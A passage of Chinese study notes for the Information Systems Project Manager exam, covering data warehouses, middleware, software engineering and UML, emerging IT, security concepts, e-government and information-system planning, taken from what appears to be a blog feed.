<p>数据仓库是一个面向主题的、集成的、非易失的、且随时间变化的数据集合，用于支持管理决策。</p>
</blockquote>
<h2 id="数据仓库的体系结构">3.14. 数据仓库的体系结构</h2>
<table>
<colgroup>
<col style="width: 20%">
<col style="width: 79%">
</colgroup>
<thead>
<tr class="header">
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>数据源</td>
<td>数据仓库的基础，是整个系统的数据源泉</td>
</tr>
<tr class="even">
<td>数据的存储与管理</td>
<td>整个数据仓库系统的核心</td>
</tr>
<tr class="odd">
<td> OLAP 服务器（联机分析处理）</td>
<td>对分析需要的数据进行有效集成，按多维模型予以组织，以便进行多角度、多层次的分析，并发现趋势</td>
</tr>
<tr class="even">
<td>前端工具</td>
<td>主要包括各种查询工具、报表工具、分析工具、数据挖掘工具以及各种基于数据仓库或数据集市的应用开发工具</td>
</tr>
</tbody>
</table>
<h2 id="中间件的定义普遍认可">3.15. 中间件的定义（普遍认可）</h2>
<ol type="1">
<li>在一个分布式系统环境中处于操作系统和应用程序之间的软件。</li>
<li>中间件是一种独立的系统软件或服务程序，分布式应用软件借助这种软件在不同的技术之间共享资源，中间件位于客户端服务器的操作系统之上，管理计算资源和网络通信。</li>
</ol>
<h2 id="中间件的分类由底向上">3.16. 中间件的分类（由底向上）</h2>
<ol type="1">
<li>底层型中间件：<code>JVM</code>、<code>CLR</code>（公共语言运行库）、<code>ACE</code>（自适配通信环境）、<code>JDBC</code>（数据库连接）、<code>ODBC</code>（开放数据库互连）等。</li>
<li>通用型中间件：<code>CORBA</code>（公共对象请求代理体系结构）、<code>J2EE</code>、<code>MOM</code>（面向消息的中间件）、<code>COM</code> 等。</li>
<li>集成型中间件：主流技术有 <code>WorkFlow</code> 和 <code>EAI</code>（企业应用集成）等，代表产品如 <code>BEA WebLogic</code> 和 <code>IBM WebSphere</code> 等。</li>
</ol>
<h2 id="不同层次与技术产品">3.17. 不同层次与技术 / 产品</h2>
<ol type="1">
<li>系统底层传输层的集成，可采用 CORBA（公共对象请求代理体系结构）技术。</li>
<li>不同系统的信息传递，可采用消息中间件产品。</li>
<li>不同硬件和操作系统的集成，可采用 J2EE 中间件产品。</li>
</ol>
<h2 id="可用性">3.18. 可用性</h2>
<p>是系统能够正常运行的时间比例。用两次故障之间的时间长度来表示。 &gt;
度量：平均无故障时间（MTTF），即计算机系统平均能够正常运行多长时间，才发生一次故障。系统的可用性越高，平均无故障时间越长。
<span class="math display">\[
计算机系统的可用性 =\frac {MTTF}{MTTF+MTTR}\times100\%
\]</span></p>
<h2 id="可靠性">3.19. 可靠性</h2>
<p>软件系统在意外或错误使用的情况下维持软件系统功能的能力。 &gt;
度量：平均维修时间（MTTR），即系统发生故障后维修和重新恢复正常运行平均花费的时间。系统的可维护性越好，平均维修时间越短。</p>
<hr>
<h1 id="软件工程">4. 软件工程</h1>
<h2 id="软件需求划分层次">4.1. 软件需求划分层次</h2>
<ol type="1">
<li>业务需求：反映业务或客户对系统高层次的目标要求。</li>
<li>用户需求：描述的是用户的具体目标，或用户要求系统必须能完成的任务。</li>
<li>系统需求：从系统的角度来说明软件的需求，包括功能需求、非功能需求和设计约束等。</li>
</ol>
<h2 id="质量功能部署qfd">4.2. 质量功能部署（QFD）</h2>
<ol type="1">
<li>是一种将用户要求转化成软件需求的技术，其目的是最大限度地提升软件工程中用户的满意度。
<ul>
<li>常规需求：用户认为系统应该做到的功能或性能。实现越多，用户越满意。</li>
<li>期望需求：用户想当然认为系统应具备的功能或性能，但并不能正确描述自己想要得到的这些功能或性能需求。期望需求没有得到实现，会让用户感到不满意。</li>
<li>意外需求：也称为<code>兴奋需求</code>，是用户要求范围外的功能或性能。实现这些需求用户会更高兴，未实现也不影响购买决策。</li>
</ul></li>
</ol>
<h2 id="需求获取">4.3. 需求获取</h2>
<blockquote>
<p>是一个确定和理解不同项目干系人的需求和约束的过程。常见的需求获取方法包含：<code>用户访谈</code>、<code>问卷调查</code>、<code>采样</code>、<code>情节串联版</code>、<code>联合需求计划</code>等。</p>
</blockquote>
<h2 id="需求分析">4.4. 需求分析</h2>
<ol type="1">
<li>一个好的需求应该具有<code>无二义性</code>、<code>完整性</code>、<code>一致性</code>、<code>可测试性</code>、<code>确定性</code>、<code>可跟踪性</code>、<code>正确性</code>、<code>必要性</code>等。</li>
<li>使用 SA 方法进行需求分析，其建立的模型的核心是<code>数据字典</code>，围绕这个核心，有三个层次的模型，分别是<code>数据模型</code>、<code>功能模型</code>和<code>行为模型（状态模型）</code>。
<ul>
<li>数据模型：一般用实体联系图（E-R 图）表示</li>
<li>功能模型：一般用数据流图（DFD）表示</li>
<li>行为模型：一般用状态转换图（STD）表示</li>
</ul></li>
</ol>
<h2 id="软件需求规格说明书srs">4.5. 软件需求规格说明书（SRS）</h2>
<p>是需求开发活动的产物。目的是使项目干系人与开发团队对系统的初始规定有一个共同的理解，使之成为整个开发工作的基础。<code>国家标准GB/T 8567-2006</code> 中规定 SRS 应包含如下内容。
&gt; 范围 &gt; 引用文件 &gt; 需求 &gt; 合格性规定 &gt; 需求可跟踪性 &gt;
尚未解决的问题 &gt; 注解 &gt; 附录</p>
<h2 id="需求验证">4.6. 需求验证</h2>
<ol type="1">
<li>也称为<code>需求确认</code>，为了确定如下几个方面的内容：
<ul>
<li>SRS 正确描述了预期的、满足项目干系人需求的系统行为和特征。</li>
<li>SRS 中的软件需求是从系统需求、业务规格和其他来源中正确推导而来的。</li>
<li>需求是完整的和高质量的。</li>
<li>需求的表示在所有地方都是一致的。</li>
<li>需求为继续进行系统设计、实现和测试提供了足够的基础。</li>
<li>一般通过需求评审和需求测试工作来对需求进行验证。需求评审就是对 SRS 进行技术评审。</li>
</ul></li>
</ol>
<h2 id="统一建模语言uml">4.7. 统一建模语言（UML）</h2>
<ol type="1">
<li><code>统一建模语言（Unified Modeling language）</code>，是一种定义良好、易于表达、功能强大且普遍适用的建模语言，它融入了软件工程领域的新思想、新方法和新技术，它的作用域不限于支持 OOA 和 OOD，支持从需求分析开始的软件开发的全过程。</li>
<li>UML 的结构包括：<code>构造块</code>、<code>规则</code>和<code>公共机制</code>三个部分。</li>
<li>UML 独立于软件开发过程，<em>它不是可视化的程序设计语言，而是一种可视化的建模语言。</em></li>
</ol>
<h2 id="uml2.0中的14种图">4.8. UML2.0 中的 14 种图</h2>
<figure>
<img src="/p/209469e/UML2.0的14种图.webp" alt="UML2.0的14种图">
<figcaption aria-hidden="true">UML2.0 的 14 种图</figcaption>
</figure>
<h2 id="uml的5个系统视图">4.9. UML 的 5 个系统视图</h2>
<table>
<colgroup>
<col style="width: 4%">
<col style="width: 7%">
<col style="width: 87%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">序号</th>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> 1</td>
<td> 逻辑视图</td>
<td>也称为设计视图，表示了设计模型中在架构方面具有重要意义的部分，即类、子系统、包和用例实现的子集</td>
</tr>
<tr class="even">
<td style="text-align: center;"> 2</td>
<td> 进程视图</td>
<td>进程视图是可执行线程和进程作为活动类的建模，它是逻辑视图的一次执行示例，描述了并发与同步结构</td>
</tr>
<tr class="odd">
<td style="text-align: center;"> 3</td>
<td> 实现视图</td>
<td>实现视图对组成基于系统的物理代码的文件和构件进行建模</td>
</tr>
<tr class="even">
<td style="text-align: center;"> 4</td>
<td> 部署视图</td>
<td>部署视图把构建部署到一组物理节点上，表示软件到硬件的映射和分布结构</td>
</tr>
<tr class="odd">
<td style="text-align: center;"> 5</td>
<td> 用例视图</td>
<td>用例视图是最基本的需求分析模型</td>
</tr>
</tbody>
</table>
<h2 id="面向对象分析ooa">4.10. 面向对象分析（OOA）</h2>
<ol type="1">
<li>基本任务是运行面向对象方法，对问题域进行分析和理解，正确认识其中的事物及他们之间的关系，找出描述问题域和系统功能所需的类和对象；定义它们的属性和职责，以及它们之间所形成的各种联系。
&gt; OOA 的任务是 “做什么”，OOD 的任务是 “怎么做”。 &gt;
面向对象分析阶段的核心工作是建立系统的用例模型与分析模型。</li>
</ol>
<h2 id="用例之间的关系">4.11. 用例之间的关系</h2>
<ol type="1">
<li>包含关系：当可以从两个或两个以上的用例中提取公共行为时，可使用包含关系来表示它们。提取出来的公共用例称为<code>抽象用例</code>，原始用例称为<code>基本用例</code>或<code>基础用例</code>。</li>
<li>扩展关系：如果一个用例明显地混合了两种或两种以上的不同场景，即根据情况可能发生多种分支，则可以将这个用例分为<code>一个基本用例</code>和<code>一个或多个扩展用例</code>，使之描述更加清晰。</li>
<li>泛化关系：当多个用例共同拥有一种类似的结构和行为的时候，可以将它们的共性抽象成<code>父用例</code>，其他用例作为泛化关系中的<code>子用例</code>。子用例是父用例的一种特殊形式，子用例继承了父用例所有的<code>结构</code>、<code>行为</code>和<code>关系</code>。</li>
</ol>
<h2 id="类之间的关系">4.12. 类之间的关系</h2>
<p><img src="/p/209469e/类之间的关系图解.webp" alt="类之间的关系图解"> 1.
关联关系：关联提供了不同类的对象之间的结构关系。关联体现的是对象实例之间的关系，而不表示两个类之间的关系。
2.
依赖关系：两个类 A 和 B，如果 B 的变化可能会引起 A 的变化，则称类 A 依赖于类 B。
3.
泛化关系：描述了一般事物与该事物中的特殊种类之间的关系，也就是父类与子类之间的关系。继承关系是泛化关系的反关系。
4.
共享聚集：也称<code>聚合关系</code>，表示类之间的整体与部分的关系，其含义是<code>部分</code>可能同时属于多个<code>整体</code>，<strong>部分与整体的声明周期可以不相同</strong>。
5.
组合聚集：通常简称为<code>组合关系</code>，与聚合关系的区别在于，组合关系中的<code>部分</code>只能属于一个<code>整体</code>，<strong>部分与整体的声明周期相同</strong>。
6.
实现关系：实现关系将说明和实现联系起来。接口是对行为而非实现的说明，而类中则包含了实现的结构。</p>
<h2 id="软件架构设计">4.13. 软件架构设计</h2>
<ol type="1">
<li>软件架构为软件系统提供了一个结构、行为和属性的高级抽象，由<code>构件的描述</code>、<code>构件的相互作用（连接件）</code>、指导构件集成的<code>模式</code>以及这些模式的<code>约束</code>组成。<strong>软件架构不仅指定了系统的组织结构和拓扑结构，并且显示了系统需求和构件之间的对应关系，提供了一些设计决策的基本原理。</strong></li>
<li>软件架构主要研究的内容：<code>软件架构描述</code>、<code>软件架构风格</code>、<code>软件架构评估</code>和<code>软件架构的形式化方法</code>等。</li>
<li>软件架构研究的根本目的：<code>解决好软件的复用、质量和维护问题</code>。</li>
<li>软件架构设计的核心问题：<code>是否能够达到架构级的软件复用</code>。</li>
</ol>
<h2 id="软件架构风格分类">4.14. 软件架构风格分类</h2>
<ol type="1">
<li>数据流风格：包括<code>批处理序列</code>和<code>管道/过滤</code>两种风格。</li>
<li>调用 / 返回风格：包括<code>主程序/子程序</code>、<code>数据抽象和面向对象</code>、以及<code>层次结构</code>。</li>
<li>独立构件风格：包括<code>进程通信</code>和<code>事件驱动</code>的系统。</li>
<li>虚拟机风格：包括<code>解释器</code>和<code>基于规则的系统</code>。</li>
<li>仓库风格：<code>数据库系统</code>、<code>黑板系统</code>和<code>超文本系统</code>。</li>
</ol>
<h2 id="软件架构评估">4.15. 软件架构评估</h2>
<ol type="1">
<li>评估人员所关注的是系统的质量属性。软件架构评估可以只针对一个架构，也可以针对一组架构。</li>
<li>敏感点：是一个或多个构件的特性。</li>
<li>权衡点：是影响多个质量属性的特性，是多个质量属性的敏感点。</li>
<li>软件架构评估技术分类：<code>基于调查问卷/检查表的方式</code>、<code>基于场景的方式（最常用）</code>、<code>基于度量的方式</code>。</li>
</ol>
<h2 id="软件设计">4.16. 软件设计</h2>
<ol type="1">
<li>分为结构化设计（SD）和面向对象设计（OOD）。</li>
<li>结构化设计：是一种面向数据流的方法，以 SRS、DFD 和数据字典等文档为基础，自顶向下、逐步求精和模块化的过程。包含概要设计和详细设计两个阶段。需遵循的原则：<code>（模块内）高内聚</code>、<code>（模块间）低耦合</code>。</li>
<li>面向对象设计：其基本思想包括：抽象、封装和可扩展性，其中可扩展性主要通过<code>继承</code>和<code>多态</code>来实现。</li>
<li>对于 OOD 而言，在支持可维护性的同时，<code>提高软件的复用性</code>是一个至关重要的问题。</li>
<li>设计模式是前人经验的总结，包含：<code>模式名称</code>、<code>问题</code>、<code>目的</code>、<code>解决方案</code>、<code>效果</code>、<code>实例代码</code>和<code>相关设计</code>。</li>
<li>根据<code>处理范围不同</code>，设计模式可分为：
<ul>
<li>类模式：处理类和子类之间的关系，这些关系通过继承建立，在编译时刻就被确定下来，属于<code>静态关系</code>。</li>
<li>对象模式：处理对象之间的关系，这些关系在运行时刻变化，更具<code>动态性</code>。</li>
</ul></li>
<li>根据<code>目的和用途不同</code>，设计模式可分为：
<ul>
<li>创建型模式：用于创建对象。</li>
<li>结构型模式：用于处理类和对象的组合。</li>
<li>行为型模式：用于描述类或对象的交互以及职责的分配。</li>
</ul></li>
</ol>
<h2 id="软件工程的过程管理">4.17. 软件工程的过程管理</h2>
<ol type="1">
<li><p>阶段式模型 <img src="/p/209469e/阶段式模型.webp" alt="阶段式模型"></p></li>
<li><p>连续式模型 <img src="/p/209469e/连续式模型.webp" alt="连续式模型"></p></li>
</ol>
<h2 id="软件测试及其管理">4.18. 软件测试及其管理</h2>
<ol type="1">
<li>测试用例应该包括：名称和标识、测试追踪、用例说明。、初始化要求、测试输入、预期结果、评价结果准侧、操作过程、前提条件和约束、测试终止条件。</li>
<li>软件测试方法可分为：
<ul>
<li>静态测试：测试对象为文档和代码，文档以检查单的形式进行，代码一般采用桌前检查、代码走查和代码审查。</li>
<li>动态测试：通过实际运行程序进行测试。
<ul>
<li>白盒测试：将程序看作一个透明的白盒，注重程序内部的逻辑结构和算法。</li>
<li>黑盒测试：也称功能测试，不考虑程序内部的结构和算法。</li>
</ul></li>
</ul></li>
<li>软件测试分类（按照测试阶段划分）：
<ul>
<li>单元测试，测试依据是<code>软件详细设计说明书</code>。</li>
<li>集成测试，测试依据是<code>软件概要设计说明书</code>。</li>
<li>确认测试，用于验证软件的功能、性能等是否与用户需求一致，包含<code>内部确认测试</code>、<code>Alpha/Beta测试</code>、<code>验收测试</code>等。</li>
<li>系统测试，测试的技术依据是用户需求或开发合同。</li>
<li>配置项测试，测试的对象时软件配置项，测试依据一般是 SRS 以及接口需求说明。</li>
<li>回归测试，其目的是测试软件变更后，变更部分的正确性和对变更需求的符合性，以及软件原有的、正确的功能、性能和其他规定要求的不损害性。</li>
</ul></li>
</ol>
<h2 id="软件集成技术">4.19. 软件集成技术</h2>
<ol type="1">
<li>表示集成：也称为<code>界面集成</code>，是黑盒集成，无须了解程序与数据库的内部构造。</li>
<li>数据集成：是白盒集成，需要解决数据和数据库的集成问题，对数据进行标识并编成目录，确定元数据类型。</li>
<li>控制集成：也称为<code>功能集成</code>或<code>应用集成</code>，控制集成是黑盒集成。</li>
<li>业务流程集成：也称为<code>过程集成</code>，由一系列基于标准的、统一数据格式的工作流组成。</li>
<li>企业之间的应用集成：能够使企业充分的利用外部资源。</li>
</ol>
<hr>
<h1 id="新一代信息技术">5. 新一代信息技术</h1>
<h2 id="物联网">5.1. 物联网</h2>
<ol type="1">
<li>指通过信息传感设备，按约定的协议，将任何物品与互联网相连接，进行信息交换和通信，以实现智能化识别、定位、跟踪、监控和管理的一种网络。</li>
<li>主要解决物品与物品、人与物品、人与人之间的互连。</li>
</ol>
<h2 id="物联网应用的关键技术">5.2. 物联网应用的关键技术</h2>
<ol type="1">
<li>传感器：主要将无线电信号转换为数字信号，如 <code>RFID（射频识别）</code>等。</li>
<li>嵌入式技术：综合计算机软硬件、传感器技术、集成电路技术、电子应用技术为一体的复杂技术。</li>
</ol>
<h2 id="物联网架构">5.3. 物联网架构</h2>
<ol type="1">
<li>可分为<code>感知层</code>、<code>网络层</code>、<code>应用层</code>三层。
<ul>
<li>应用层：物联网与用户的接口，是物联网发展的根本目标。</li>
<li>网络层：由各种网络，包含互联网、广电网、网络管理系统和云计算平台等组成，是整个物联网的中枢。</li>
<li>感知层：由各种传感器组成，如温湿度传感器、二维码标签、RFID 标签、摄像头、GPS 等感知终端，是物联网识别物品、采集信息的来源。</li>
</ul></li>
</ol>
<h2 id="云计算定义">5.4. 云计算定义</h2>
<ol type="1">
<li>云计算是一种基于<code>互联网</code>的计算方式。是推动信息技术能力实现按需供给、促进信息技术和数据资源充分利用的全新业态。</li>
</ol>
<h2 id="云计算类型">5.5. 云计算类型</h2>
<p>按照云计算服务提供的资源层次，可分为如下三种服务类型。 1.
IaaS（基础设施及服务），向用户提供<code>计算机能力</code>、<code>存储空间</code>等基础设施方面的服务。
2.
PaaS（平台即服务），向用户提供<code>虚拟的操作系统</code>、<code>数据库管理系统</code>、<code>Web应用</code>等平台化的服务。
3.
SaaS（软件即服务），向用户提供<code>应用软件（CRM/办公软件等）</code>、<code>组件</code>、<code>工作流</code>等虚拟化软件的服务。</p>
<h2 id="大数据定义">5.6. 大数据定义</h2>
<ol type="1">
<li>指无法在一定时间范围内用常规软件工具进行捕捉、管理和处理的数据集合，是需要新处理模式才能具有更强的决策力、洞察发现力和流程优化能力的海量、高增长率和多样化的信息资产。</li>
</ol>
<h2 id="大数据的特征">5.7. 大数据的特征</h2>
<ol type="1">
<li>大量（Volume），数据体量巨大。</li>
<li>多样（Variety），数据类型繁多。</li>
<li>价值（Value），价值密度的高低与数据总量大小成反比，数据总量越大，价值密度越低。</li>
<li>高速（Velocity），处理速度快。</li>
<li>真实性（Veracity），数据来自于各种、各类信息系统网络以及网络终端的行为或痕迹。
&gt; 大数据是具有体量大、结构多样、时效性强等特征的数据。</li>
</ol>
<h2 id="大数据处理环节">5.8. 大数据处理环节</h2>
<p>大数据从数据源经过分析挖掘到最终获得价值一般需要经过 5 个主要环节，包含：
1. 数据准备 2. 数据存储与管理 3. 计算处理 4. 数据分析 5. 知识展现</p>
<h2 id="移动互联网的特点">5.9. 移动互联网的特点</h2>
<ol type="1">
<li>终端移动性</li>
<li>业务使用的私密性</li>
<li>终端和网络的局限性</li>
<li>业务与终端、网络的强关联性</li>
</ol>
<hr>
<h1 id="信息系统安全技术">6. 信息系统安全技术</h1>
<h2 id="信息安全的有关概念">6.1. 信息安全的有关概念</h2>
<ol type="1">
<li>安全属性
<ul>
<li>私密性，信息不被未授权者知晓的属性。</li>
<li>完整性，信息是正确的、真实的、未被篡改的、完整无缺的属性。</li>
<li>可用性，信息可以随时被正常使用的属性。</li>
</ul></li>
<li>信息系统安全可以划分为四个层次
<ul>
<li>设备安全，包含设备稳定性、可靠性和可用性。</li>
<li>数据安全，包含秘密性、完整性和可用性（静态安全）。</li>
<li>内容安全，政治上健康，符合国家法律法规，符合道德规范，且内容保密、知识产权保护、信息隐藏和隐私保护等。</li>
<li>行为安全，包含行为的秘密性、完整性和可控性（动态安全）。</li>
</ul></li>
<li>信息系统的安全保护等级
<ul>
<li>第一级，既不损害社会秩序和公共利益，也未损害国家安全。</li>
<li>第二级，对社会秩序和公共利益造成损害，但未损害国家安全。</li>
<li>第三级，既对社会秩序和公共利益造成严重损害，也损害了国家安全。</li>
<li>第四级，既对社会秩序和公共利益造成特别严重损害，同时对国家安全造成严重损害。</li>
<li>第五级，信息系统受到破坏后，对国家安全造成特别严重损害。 &gt;
以上五个层级，均包含对公民、法人和其他组织的合法权益造成损害。</li>
</ul></li>
</ol>
<h2 id="加密技术">6.2. 加密技术</h2>
<ol type="1">
<li>加密技术的基本思想是伪装信息，使未授权者不能理解它的真实含义。</li>
</ol>
<h2 id="对称非对称加密技术的对比">6.3. 对称、非对称加密技术的对比</h2>
<table>
<colgroup>
<col style="width: 8%">
<col style="width: 31%">
<col style="width: 60%">
</colgroup>
<thead>
<tr class="header">
<th>加密类型</th>
<th>对称加密</th>
<th>非对称加密</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>含义</td>
<td>加密和解密使用相同的密钥</td>
<td>加密用<code>公钥</code>，解密用<code>私钥</code>。</td>
</tr>
<tr class="even">
<td>优点</td>
<td>简单便捷，加解密快，管理简单</td>
<td>安全性高，破译困难，体制安全，密钥量小，算法灵活性好。</td>
</tr>
<tr class="odd">
<td>缺点</td>
<td>加密强度不高，破译相对容易</td>
<td>加解密速度相对慢，密钥管理复杂</td>
</tr>
<tr class="even">
<td>典型算法</td>
<td> DES,IDEA,AES</td>
<td>RSA,ECC</td>
</tr>
</tbody>
</table>
<h2 id="hash函数">6.4. Hash 函数</h2>
<ol type="1">
<li><code>Hash函数</code>将任意长的报文映射为定长的 Hash 码，可提供保密性，报文认证以及数字签名功能。</li>
</ol>
<h2 id="数字签名">6.5. 数字签名</h2>
<ol type="1">
<li>是证明当事者的身份和数据真实性的一种信息。它是采用<code>非对称加密技术</code>与数字摘要技术的应用。</li>
<li>完善的数字签名体系应满足以下条件：
<ul>
<li>签名者事后不能抵赖自己的签名。</li>
<li>任何其他人不能伪造签名。</li>
<li>如果当事的双方关于签名的真伪发生争执，能够在公正的仲裁者面前通过验证签名来确认其真伪。
&gt; 利用 RSA 密码可以同时实现数字签名和数据加密。</li>
</ul></li>
</ol>
<h2 id="认证的概念">6.6. 认证的概念</h2>
<ol type="1">
<li>认证，又称为鉴别、确认，它是证实某事是否名副其实或者是否有效的一个过程。</li>
<li>认证和加密的区别在于：
<ul>
<li>加密用以确保数据的保密性，阻止对手的被动攻击，如截取、窃听等。</li>
<li>认证用以确保报文发送者和接收者的真实性以及豹纹的完整性，阻止对手的主动攻击，如冒充、篡改、重播等。</li>
</ul></li>
</ol>
<h2 id="信息系统安全">6.7. 信息系统安全</h2>
<ol type="1">
<li>信息系统安全主要包括：<code>计算机设备安全</code>、<code>网络安全</code>、<code>操作系统安全</code>、<code>数据库系统安全</code>、<code>应用系统安全</code>。</li>
<li>计算机设备安全包括：
<ul>
<li>物理安全，免遭地震、水灾、火灾等环境事故。</li>
<li>设备安全，设备的防盗和防毁，防止电磁泄漏，抗电磁干扰，电源保护等。</li>
<li>存储介质安全，存储介质本身的防盗防毁等，介质内数据的安全。</li>
<li>可靠性技术，采用容错系统（冗余设计）实现，以增加资源换取可靠性。</li>
</ul></li>
<li>网络安全防御技术：
<ul>
<li>防火墙，静态的安全技术。</li>
<li>入侵检测系统和入侵防护系统，监视网络 + 主动防护。</li>
<li>VPN，在公用网络中建立专用的、安全的数据通信通道的技术。</li>
<li>安全扫描，包含漏洞扫描、端口扫描、密码类（弱口令）扫描等。</li>
<li>网络蜜罐技术，主动防御技术，蜜罐系统是一个包含漏洞的诱骗系统。</li>
</ul></li>
<li>操作系统安全
<ul>
<li>切断，对<code>可用性</code>的威胁。</li>
<li>截取，对<code>机密性</code>的威胁。</li>
<li>篡改，对<code>完整性</code>的威胁。</li>
<li>伪造，对<code>合法性</code>的威胁。</li>
</ul></li>
<li>数据库系统安全
<ul>
<li>物理数据库的安全</li>
<li>逻辑数据库的安全</li>
<li>元素安全性</li>
<li>可审计性</li>
<li>访问控制</li>
<li>身份认证</li>
<li>可用性</li>
<li>推理控制</li>
<li>多级保护</li>
</ul></li>
<li>应用系统安全
<ul>
<li>是以计算机设备安全、网络安全和数据库安全为基础的。</li>
</ul></li>
</ol>
<h2 id="web威胁防护技术">6.8. Web 威胁防护技术</h2>
<ol type="1">
<li>Web 访问控制技术，<code>保证网络资源不被非法访问者访问</code>。</li>
<li>单点登录（SSO）技术，<code>单点登录为应用系统提供几种统一的身份认证</code>。</li>
<li>网页防篡改技术，包含<code>时间轮询技术</code>、<code>核心内核技术</code>、<code>事件触发技术</code>、<code>文件过滤驱动技术</code>。</li>
<li>Web 内容安全包含<code>电子邮件过滤</code>、<code>网页过滤</code>、<code>反间谍软件</code>三项技术。</li>
</ol>
<h1 id="信息化法阵与应用">7. 信息化法阵与应用</h1>
<h2 id="电子政务">7.1. 电子政务</h2>
<h3 id="应用模式">7.1.1. 应用模式</h3>
<ol type="1">
<li><code>政府对政府（G2G）</code>，指政府上下级之间、不同地区和不同职能部门之间实现的电子政务活动。</li>
<li><code>政府对企业（G2B）</code>，政府向企业提供的各种公众服务。</li>
<li><code>政府对公众（G2C）</code>，政府面向龚总所提供的的服务。</li>
<li><code>政府对公务员（G2E）</code>，政府与政府公务员之间的电子政务。</li>
</ol>
<h2 id="电子商务">7.2. 电子商务</h2>
<h3 id="电子商务定义">7.2.1. 电子商务定义</h3>
<p>利用计算机技术、网络技术和远程通信技术，实现整个商务过程的电子化、数字化和网络化。</p>
<h3 id="电子商务模式">7.2.2. 电子商务模式</h3>
<ol type="1">
<li>B2B，即企业与企业之间，通过互联网进行产品、服务及信息的交换。</li>
<li>B2C，企业与消费者之间的电子商务。</li>
<li>C2C，消费者与消费者之间，通过交易平台进行交易的一种模式。</li>
<li>O2O，含义是线上购买线下的商品和服务，实体店提货或享受服务。</li>
<li>B2G，企业对政府，也称为 B2A 模式，例如：政府采购企业的产品等。</li>
</ol>
<h2 id="工业与信息化融合">7.3. 工业与信息化融合</h2>
<ol type="1">
<li><code>两化融合</code>是信息化和工业化深度融合，智能制造是两化深度融合的主攻方向。</li>
</ol>
<h2 id="智慧化">7.4. 智慧化</h2>
<ol type="1">
<li>智能一般具有<code>感知能力</code>、<code>记忆和思维能力</code>、<code>学习和自适应能力</code>、<code>行为决策能力</code>等特点。</li>
</ol>
<h2 id="智慧城市">7.5. 智慧城市</h2>
<ol type="1">
<li>国际电工委员会（IEC）对智慧城市的定义：智慧城市是城市发展的新理念，是推动政府职能转变、推进社会管理创新的新方法，目标是<code>使得基础设施更加智能，公共服务更加便捷，社会管理更加精细，生态环境更加宜居，产业体系更加优化</code>。</li>
</ol>
<h1 id="信息系统服务管理">8. 信息系统服务管理</h1>
<h2 id="信息系统工程监理">8.1. 信息系统工程监理</h2>
<ol type="1">
<li>是指依法设立且具备相应资质的信心系统工程监理单位，<code>受业务单位（建设单位）委托</code>，依据国家有关法律法规、技术标准和信息系统工程监理合同，对信息系统工程项目实施的监督管理。</li>
</ol>
<h2 id="信息系工程监理活动">8.2. 信息系工程监理活动</h2>
<p>主要的内容是<code>四控、三管、一协调</code>。 1. 四控： -
信息系统工程的<code>质量控制</code> -
信息系统工程的<code>进度控制</code> -
信息系统工程的<code>投资控制</code> -
信息系统工程的<code>变更控制</code> 2. 三管： -
信息系统工程的<code>合同管理</code> -
信息系统工程的<code>信息管理</code> -
信息系统工程的<code>安全管理</code> 3. 一协调： -
在信息系统工程实施过程中协调有关单位间的工作关系</p>
<h2 id="信息系统运行维护的概念和发展">8.3.
信息系统运行维护的概念和发展</h2>
<ol type="1">
<li><code>IT服务管理（ITSM）</code>是一套帮助组织对 IT 系统的规划、研发、实施和运营进行有效管理的方法，是一套方法论。</li>
<li>ISTM 的核心思想是：IT 组织不管是组织内部还是外部，都是 IT 服务提供者，其主要工作就是<code>提供低成本、高质量的IT服务</code>。</li>
<li>ISTM 是一种 IT 管理，与传统的 IT 管理不同它是一种<code>以服务为中心的IT管理</code>。</li>
</ol>
<h1 id="信息系统规划">9. 信息系统规划</h1>
<h2 id="大型信息系统概念">9.1. 大型信息系统概念</h2>
<ol type="1">
<li>大型信息系统是指：以信息技术和通信技术为支撑，规模庞大、分布广阔、采用多级网络结构，跨越多个安全域，处理海量的，复杂且形式多样的数据，提供多种类型应用的大系统（如淘宝、微信）。</li>
</ol>
<h2 id="大型信息系统的特点">9.2. 大型信息系统的特点</h2>
<ol type="1">
<li>规划庞大</li>
<li>跨地域性</li>
<li>网络结构复杂</li>
<li>业务种类多</li>
<li>数据量大</li>
<li>用户多</li>
</ol>
<h2 id="信息系统规划原则">9.3. 信息系统规划原则</h2>
<ol type="1">
<li>支持企业的战略目标</li>
<li>整体上着眼于高层管理，兼顾各管理层、各业务层的要求</li>
<li>涉及的信息系统结构要有好的整体性和一致性</li>
<li>信息系统应该适应企业组织结构和管理体制的改变</li>
</ol>
<h2 id="企业实施信息系统规划的步骤">9.4. 企业实施信息系统规划的步骤</h2>
<ol type="1">
<li>分析企业信息化现状</li>
<li>制定企业信息化战略</li>
<li>信息系统规划方案拟定和总体构架设计</li>
</ol>
<h2 id="企业规划方法的步骤">9.5. 企业规划方法的步骤</h2>
<pre class="mermaid">graph TD
A(准备工作)--&gt;B(定义企业过程) --&gt; C(识别定义数据类) --&gt; D(分析现有系统) --&gt; E(确定管理部门对系统的要求) --&gt; G(制定建议书和开发计划) --&gt; H(成果报告)</pre>
<h2 id="信息系统的规划工具">9.6. 信息系统的规划工具</h2>
<ol type="1">
<li>在制定计划时，可以使用 <code>PERT图</code>和<code>甘特图</code>。</li>
<li>访谈时，可以应用各种<code>调查表</code>和<code>调查提纲</code>。</li>
<li>确定各部门、各层管理人员的需求，梳理流程时，采用<code>会谈</code>和<code>正式会谈</code>的方法。</li>
<li>为把企业组织结构和企业过程联系起来，说明每个过程的联系，可采用<code>过程/组织（P/O）矩阵</code>。</li>
<li>为定义数据类，可采用实体法归纳出数据类，列出企业资源，再列出<code>资源/数据（R/D）矩阵</code>。</li>
<li>功能法也称为过程法，分析每个过程的输入输出数据类，可采用<code>输入-处理-输出（IPO）图</code>表示。</li>
<li>企业过程和数据类定义好后，按照企业过程生成数据类关系，形成 <code>CU矩阵</code>。
<img src="/p/209469e/PO矩阵示例.webp" alt="PO矩阵示例"> <img src="/p/209469e/RD矩阵示例.webp" alt="RD矩阵示例"> <img src="/p/209469e/CU矩阵示例.webp" alt="CU矩阵示例"></li>
</ol>
]]></content>
      <categories>
        <category>信管备考</category>
      </categories>
      <tags>
        <tag>信息系统项目管理师</tag>
      </tags>
  </entry>
  <entry>
    <title>【信管备考知识点】第 2 章 - 信息系统项目管理基础</title>
    <url>/p/a68489ed.html</url>
    <content><![CDATA[<h1 id="项目管理基础">1. 项目管理基础</h1>
